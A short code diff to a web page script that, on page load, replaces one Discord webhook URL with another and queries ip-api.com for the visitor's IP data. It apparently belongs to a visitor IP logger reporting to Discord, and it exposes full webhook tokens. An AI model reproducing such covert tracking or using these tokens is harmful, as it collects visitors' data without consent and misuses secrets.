@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function() {
 
-    const webhookURL = 'https://discord.com/api/webhooks/1096640171140726876/Hg6SMNMWs3xJ1tTFyY_KBu5wZmUw8yqrwYSoIz_trv9VAhqsOCQh0vdgo_gleFfyGEgd';
+    const webhookURL = 'https://discord.com/api/webhooks/1187006527123492996/zUeI4hUr2xmulw3K613wHu7-a5SlmMq2ho6ggcvZik3iGCoHmq_A1T5tdceO19J9uH7E';
 
     // Specify the IP address you want to query
     fetch(`http://ip-api.com/json`)
